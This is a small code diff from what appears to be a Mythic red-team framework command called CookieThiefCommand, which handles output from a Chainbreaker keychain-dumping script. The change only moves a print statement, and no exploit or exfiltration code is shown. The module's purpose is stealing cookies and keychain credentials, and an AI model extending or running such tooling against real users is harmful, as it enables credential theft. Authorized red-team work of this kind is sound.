@@ -98,12 +98,13 @@ class CookieThiefCommand(CommandBase):
                 }
             )
 
-            print(keychainoutput)
-            sys.stdout.flush()
 
         except Exception as e:
             print("Chainbreaker script failed with error: " + str(e))
             sys.stdout.flush()
+
+        print(keychainoutput)
+        sys.stdout.flush()
 
         # try:
         #     if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
